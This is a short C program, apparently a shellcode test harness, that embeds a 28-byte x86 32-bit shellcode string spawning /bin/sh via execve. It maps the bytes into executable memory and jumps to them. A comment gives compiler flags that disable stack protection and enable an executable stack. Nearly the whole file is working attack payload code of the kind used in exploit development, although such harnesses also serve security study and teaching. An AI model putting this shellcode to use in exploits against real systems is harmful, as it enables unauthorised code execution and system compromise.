/* Important note: To compile use:
 gcc -fno-stack-protector -z execstack -m32 -o shellcode_test shellcode_test.c*/

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";


int main(){
    printf("Shellcode Length: %d bytes\n", strlen(shellcode));
    // Create executable memory for the shellcode 
    unsigned char * payload = mmap(NULL, strlen(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    // Copy shellcode into executable memory 
    memcpy(payload, shellcode, strlen(shellcode));

    printf("Executing Shellcode @ %p\n", (void*)payload);
    // Execute the shellcode
    (*(void  (*)()) payload)();
}
